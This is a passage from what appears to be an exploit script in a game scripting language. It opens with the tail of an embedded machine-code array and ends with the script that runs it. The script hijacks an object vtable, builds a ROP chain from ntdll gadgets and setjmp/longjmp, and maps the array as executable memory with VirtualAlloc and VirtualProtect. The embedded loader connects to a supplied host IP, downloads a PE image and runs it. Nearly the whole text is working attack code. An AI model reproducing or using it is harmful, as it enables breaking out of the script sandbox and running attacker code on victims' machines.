,0,72,141,13,113,254,255,255,255,208,72,137,199,72,133,192,15,132,151,2,0,0,72,141,21,216,254,255,255,72,137,241,232,22,3,0,0,72,137,68,36,120,72,141,21,209,254,255,255,72,137,241,232,2,3,0,0,72,137,68,36,112,72,141,21,201,254,255,255,72,137,241,232,238,2,0,0,72,137,68,36,104,72,141,21,125,254,255,255,72,137,241,232,218,2,0,0,73,137,197,72,141,21,129,254,255,255,72,137,241,232,200,2,0,0,73,137,199,72,141,21,101,254,255,255,72,137,241,232,182,2,0,0,72,137,68,36,88,72,141,21,140,254,255,255,72,137,241,232,162,2,0,0,72,137,68,36,96,72,141,21,10,254,255,255,72,137,241,232,142,2,0,0,72,137,195,72,141,21,205,253,255,255,72,137,249,232,124,2,0,0,72,137,197,72,141,21,209,253,255,255,72,137,249,232,106,2,0,0,73,137,198,72,141,21,180,253,255,255,72,137,249,232,88,2,0,0,72,137,198,72,141,21,184,253,255,255,72,137,249,232,70,2,0,0,72,137,199,72,141,13,85,253,255,255,76,141,164,36,48,2,0,0,76,137,226,65,184,200,0,0,0,255,211,72,131,100,36,48,0,199,68,36,40,128,0,0,0,199,68,36,32,2,0,0,0,76,137,225,186,0,0,0,64,69,49,192,69,49,201,65,255,213,73,137,196,72,141,148,36,152,0,0,0,102,185,2,2,255,213,131,100,36,40,0,72,131,100,36,32,0,185,2,0,0,0,186,1,0,0,0,65,184,6,0,0,0,69,49,201,65,255,214,72,137,197,185,0,0,0,68,255,215,72,141,148,36,136,0,0,0,199,2,2,0,31,144,137,66,4,72,131,98,8,0,72,131,100,36,48,0,72,131,100,36,40,0,72,131,100,36,32,0,72,137,233,65,184,16,0,0,0,69,49,201,255,214,76,141,76,36,68,65,131,33,0,72,141,84,36,72,131,34,0,72,131,100,36,32,0,72,137,233,65,184,4,0,0,0,65,255,215,133,192,15,132,208,0,0,0,139,124,36,72,15,207,49,201,72,137,250,65,184,0,16,0,0,65,185,4,0,0,0,72,139,92,36,120,255,211,72,137,198,72,131,100,36,32,0,76,141,76,36,68,72,137,233,72,137,194,65,137,248,65,255,215,137,193,184,3,0,0,16,133,201,15,132,10,1,0,0,57,124,36,68,15,133,0,1,0,0,72,141,84,36,76,131,34,0,72,131,100,36,32,0,76,141,76,36,68,72,137,233,65,184,4,0,0,0,65,255,215,133,192,116,111,76,137,100,36,80,68,139,108,36,76,65,15,205,49,201,76,137,234,65,184,0,16,0,0,65,185,4,0,0,0,255,211,73,137,196,72,141,92,36,68,77,137,238,77,133,246,126,70,76,137,234,76,41,242,76,1,226,72,131,100,36,32,0,72,137,233,69,137,240,73,137,217,65,255,215,133,192,15,132,133,0,0,0,139,68,36,68,73,41,198,235,207,184,2,0,0,16,235,122,72,184,4,36,0,0,1,0,0,0,235,110,184,4,0,0,16,235,103,76,141,140,36,128,0,0,0,65,131,33,0,72,137,241,72,137,250,65,184,32,0,0,0,255,84,36,104,76,141,140,36,132,0,0,0,65,131,33,0,72,131,100,36,32,0,72,139,124,36,80,72,137,249,76,137,226,69,137,232,255,84,36,88,76,137,225,49,210,65,184,0,128,0,0,255,84,36,112,72,137,249,72,139,124,36,96,255,215,72,137,233,255,215,255,214,235,5,184,5,0,0,16,72,129,196,248,2,0,0,91,93,95,94,65,92,65,93,65,94,65,95,195,65,87,65,86,65,85,65,84,86,87,85,83,102,129,57,77,90,15,133,159,0,0,0,139,65,60,139,132,1,136,0,0,0,68,139,76,1,24,68,139,68,1,28,68,139,92,1,32,68,139,84,1,36,49,192,69,49,228,77,57,204,15,132,142,0,0,0,73,141,124,36,1,68,137,230,65,141,28,179,139,28,25,128,60,25,0,73,137,252,116,223,72,1,203,73,199,199,255,255,255,255,69,49,228,77,137,230,66,128,124,59,1,0,77,141,127,1,77,141,100,36,1,117,236,73,199,197,255,255,255,255,66,128,124,42,1,0,77,141,109,1,117,244,73,137,252,77,57,253,117,163,69,49,255,73,131,238,1,114,26,66,138,44,58,77,141,103,1,66,58,44,59,77,137,231,116,233,73,137,252,235,132,49,192,235,23,65,141,4,114,15,183,4,1,37,255,63,0,0,65,141,4,128,139,4,1,72,1,200,91,93,95,94,65,92,65,93,65,94,65,95,195,86,101,72,139,4,37,96,0,0,0,72,139,80,24,72,131,194,16,49,192,73,137,208,77,139,72,96,77,133,201,116,83,73,199,195,255,255,255,255,49,246,73,137,242,102,67,131,124,89,2,0,77,141,91,1,72,141,118,1,117,236,72,199,198,255,255,255,255,102,131,124,113,2,0,72,141,118,1,117,244,76,57,222,117,30,69,49,219,73,131,234,1,114,31,67,15,183,52,25,102,66,51,52,25,73,131,195,2,102,247,198,223,255,116,229,77,139,0,73,57,208,117,156,235,9,73,139,80,48,184,1,0,0,0,94,195,204,204,204,1,19,10,0,19,1,95,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,12,8,0,12,48,11,80,10,112,9,96,8,192,6,208,4,224,2,240,1,1,1,0,1,96,0,0
]


// hex printing helper functions
let i2c_map = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
let c2i_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'A': 0xA, 'B': 0xB, 'C': 0xC, 'D': 0xD, 'E': 0xE, 'F': 0xF}

fn hex_to_num(s) {
	var str_len = len(s)
	var res = 0
	for (var i = 0; i < str_len; i++)
	{
		res = res << 4
		res = res + c2i_map[s[i]]
	}
	return res
}

fn num_to_hex(num, byte_count) {
	if (byte_count > 8) {
		byte_count = 8
	}
	var res = ""
	for (var i = 0; i < byte_count * 2; i++) {
		var idx = (num >> (4 * i)) & 15
		res = i2c_map[idx] + res 
	}
	return res
}

fn num_to_hex8(num) {
	return num_to_hex(num, 1)
}

fn num_to_hex16(num) {
	return num_to_hex(num, 2)
}

fn num_to_hex32(num) {
	return num_to_hex(num, 4)
}

fn num_to_hex64(num) {
	return num_to_hex(num, 8)
}

fn hex_dump(addr, count) {
	for (var i = 0; i < count; i++) {
		if (i > 0 && (i % 16) == 0) {
			printConsole("\n")
		}
		var cur_byte = pointerGetUnsignedInteger8Bit(0, addr + i)
		printConsole(num_to_hex8(cur_byte) + " ")
	}
}

fn array_fill(arr) {
	var arr_len = len(arr)
	for (var i = 0; i < arr_len; i++) {
		arr[i] = 0x41
	}
}

fn round_down(val, bound) {
	return floor(val - (val % bound))
}

fn array_compare(a1, a2) {
	if (len(a1) != len(a2)) {
		return false
	}
	var arr_len = len(a1)
	
	for (var i = 0; i < arr_len; i++) {
		if (a1[i] != a2[i]) {
			return false
		}
	}

	return true
}

// shorthand helpers for memory access
fn write8(addr, val) {
	pointerSetUnsignedInteger8Bit(0, addr, val)
}

fn read8(addr) {
	return pointerGetUnsignedInteger8Bit(0, addr)
}

fn write16(addr, val) {
	pointerSetAtOffsetUnsignedInteger16Bit(0, addr, val)
}

fn read16(addr) {
	return pointerGetAtOffsetUnsignedInteger16Bit(0, addr)
}

fn write32(addr, val) {
	pointerSetAtOffsetUnsignedInteger(0, addr, val)
}

fn read32(addr) {
	return pointerGetAtOffsetUnsignedInteger(0, addr)
}


fn write64(addr, val) {
	pointerSetAtOffsetUnsignedInteger64Bit(0, addr, val)
}

fn read64(addr) {
	return pointerGetAtOffsetUnsignedInteger64Bit(0, addr)
}

// helper to read a 64-bit val and automatically make it a hex str
fn read64_hex(addr) {
	var val_low = read32(addr)
	var val_high = read32(addr+4)
	return num_to_hex32(val_high) + num_to_hex32(val_low)
}

fn read_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		buf[i] = read8(addr + i)
	}
}

fn write_buf(addr, buf) {
	var buf_len = len(buf)
	for (var i = 0; i < buf_len; i++) {
		write8(addr+i, buf[i])
	}
}

fn find_bytes(addr, max_len, pattern, buf) {
	for (var i = 0; i < max_len; i++) {
		read_buf(addr + i, buf)
		if (array_compare(pattern, buf)) {
			return addr + i
		}
	}
	return 0
}

fn find64(addr, max_len, v) {
	var offset = 0
	while (1) {
		var temp_val = read64(addr+offset)
		if (temp_val == v) {
			return addr+offset
		}
		offset += 8
	}
	return 0
}

// shorthand funcs
fn ptr_to_num(p) {
	return numberFromRaw64BitUnsignedInteger(p)
}

fn make_cstr(s) {
	var str_len = len(s) + 1
	var s_ptr = globalArrayNew8Bit(s, str_len)
	pointerSetString(s_ptr, 0, s)
	return ptr_to_num(s_ptr)
}

var gs_base = 0
var ntdll_base = 0
var kernelbase_base = 0
var longjmp_ptr = 0
var setjmp_ptr = 0
var gadget_ptr = 0
var gadget_rsp0x48_ptr = 0
var gadget_pushrax_ptr = 0
fn call_native(func_ptr, rcx, rdx, r8, r9) {
	// set this gadget here
	gadget_rsp0x48_ptr = gs_base + 0xE04B
	gadget_pushrax_ptr = gs_base + 0x1F13A
	var call_done = false

	// allocate 0x120 (space for vtable + setjmp data)
	var obj_ptr = globalArrayNew8Bit("call", 0x100)
	var objp = ptr_to_num(obj_ptr)
	var vt_ptr = globalArrayNew8Bit("vtable", 0x18)
	var vtp = ptr_to_num(vt_ptr)
	var stack_size = 0x4000
	var stack_ptr = globalArrayNew8Bit("stack", stack_size)
	var stackp = ptr_to_num(stack_ptr)
	var jmpctx_ptr = globalArrayNew8Bit("jctx", 0x100)
	var jcp = ptr_to_num(jmpctx_ptr)

	// set up vtable pointers
	write64(vtp+8, setjmp_ptr)
	write64(objp, vtp)

	// trigger vtable call
	slBus_destroy(obj_ptr)

	memcpy(jmpctx_ptr, 0, obj_ptr, 0, 0x100)

	// set up our rop chain
	var r10 = 0
	var r11 = 0
	write64(stackp+stack_size-0xA0, rdx)
	write64(stackp+stack_size-0x98, rcx)
	write64(stackp+stack_size-0x90, r8)
	write64(stackp+stack_size-0x88, r9)
	write64(stackp+stack_size-0x80, r10)
	write64(stackp+stack_size-0x78, r11)
	write64(stackp+stack_size-0x70, func_ptr)
	write64(stackp+stack_size-0x68, gadget_pushrax_ptr)
	// 0x30 bytes of padding
	write64(stackp+stack_size-0x38, 0x15151515)
	write64(stackp+stack_size-0x30, gs_base+0x109C4A)
	write64(stackp+stack_size-0x28, jcp)
	write64(stackp+stack_size-0x20, longjmp_ptr);
	
	// set up the context to do the longjmp
	write64(vtp+8, longjmp_ptr)
	write64(objp, vtp)
	// rsp
	write64(objp+0x10, stackp+stack_size-0xA0)
	// rip
	write64(objp+0x50, gadget_ptr)
	
	// trigger vtable call
	slBus_destroy(obj_ptr)
	var ret_val = read64(stackp+stack_size-0x68)

	// clean up our objects
	globalArrayDelete("call")
	globalArrayDelete("vtable")
	globalArrayDelete("stack")
	globalArrayDelete("jctx")

	return ret_val
}

fn find_module_base(addr) {
	var search_addr = round_down(addr, 0x10000)	

	while (1) {
		var magic_static = [0x4D, 0x5A]
		var magic_read = [0, 0]
		read_buf(search_addr, magic_read)

		if (array_compare(magic_static, magic_read)) {
			return search_addr
		}
		search_addr -= 0x10000
	}
	return 0
}

fn get_dll_exports(base_addr) {
	var res = {}
	var magic_static = [0x4D, 0x5A]
	var magic_read = [0, 0]
	read_buf(base_addr, magic_read)

	if (!array_compare(magic_static, magic_read)) {
		printConsole("Magic is invalid!\n")
		return res
	}

	
	var e_lfanew = read32(base_addr+0x3c)
	var exports_addr = base_addr + read32(base_addr+e_lfanew+0x70+0x18)

	var num_funcs = read32(exports_addr+0x14)
	var num_names = read32(exports_addr+0x18)

	var funcs_addr = base_addr + read32(exports_addr+0x1c)
	var names_addr = base_addr + read32(exports_addr+0x20)
	var ords_addr = base_addr + read32(exports_addr+0x24)

	for (var i = 0; i < num_names; i++) {
		var name_addr = base_addr + read32(names_addr + (4 * i))
		var name_str = pointerGetSubstring(0, name_addr, 0x20)
		var ordinal = read16(ords_addr + (2 * i))
		var func_addr =  base_addr + read32(funcs_addr + (4 * ordinal))
		res[name_str] = func_addr
		//printConsole("Export: " + name_str + " - " + num_to_hex64(func_addr) + "\n")
	}

	return res
}

var VirtualAlloc_ptr = 0
var VirtualProtect_ptr = 0
fn map_code(code) {
	var code_addr = call_native(VirtualAlloc_ptr, 0, 0x100000, 0x3000, 4)
	write_buf(code_addr, code)

	var oldp_ptr = globalArrayNew8Bit("oldp", 0x100)
	var oldpp = ptr_to_num(oldp_ptr)
	call_native(VirtualProtect_ptr, code_addr, 0x100000, 0x20, oldpp)
	return code_addr
}

fn map_page(addr) {
	var code_addr = call_native(VirtualAlloc_ptr, addr, 0x100000, 0x3000, 4)
	return code_addr
}


// create and dump our object to the terminal
var slbus_ptr = slBus_create()
var slp = numberFromRaw64BitUnsignedInteger(slbus_ptr)

// get the base of the GameScript module via the vtable
gs_base = read64(slp) - 0x16faf8

ntdll_base = find_module_base(read64(gs_base + 0x125398))
kernelbase_base = find_module_base(read64(gs_base + 0x1253A0))

var setjmp_bytes = [0x48,0x89,0x11,0x48,0x89,0x59,0x08,0x48,0x89,0x69,0x18,0x48,0x89,0x71,0x20,0x48]
var longjmp_bytes = [0x48,0x8B,0xC2,0x48,0x8B,0x59,0x08,0x48,0x8B,0x71,0x20,0x48,0x8B,0x79,0x28,0x4C]
var tmp_bytes = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]

setjmp_ptr = find_bytes(ntdll_base, 0x217000, setjmp_bytes, tmp_bytes)
longjmp_ptr = find_bytes(ntdll_base, 0x217000, longjmp_bytes, tmp_bytes)

// bytes for the following gadget: pop rdx;pop rcx;pop r8;pop r9;pop r10;pop r11; ret
var gadget_bytes = [0x5A, 0x59, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3]
tmp_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
gadget_ptr = find_bytes(ntdll_base, 0x217000, gadget_bytes, tmp_bytes)


// get the ntdll & kernel base exports and find VirtualAlloc/Protect
var kernelbase_exports = get_dll_exports(kernelbase_base)
var ntdll_exports = get_dll_exports(ntdll_base)
VirtualAlloc_ptr = kernelbase_exports["VirtualAlloc"]
VirtualProtect_ptr = kernelbase_exports["VirtualProtect"]
var VirtualFree_ptr = kernelbase_exports["VirtualFree"]


// allocate our token info buffer
var tinfo_ptr = globalArrayNew8Bit("tinfo", 0x2000)
var tinfop = ptr_to_num(tinfo_ptr)

// write the ip to the global page
var global_page = map_page(0x44000000)
pointerSetString(0, global_page, host_ip)

// map the pe loader
var pe_loader_ptr = map_code(pe_loader_code)
var pe_ret = call_native(pe_loader_ptr, 0, 0, 0, 0)

```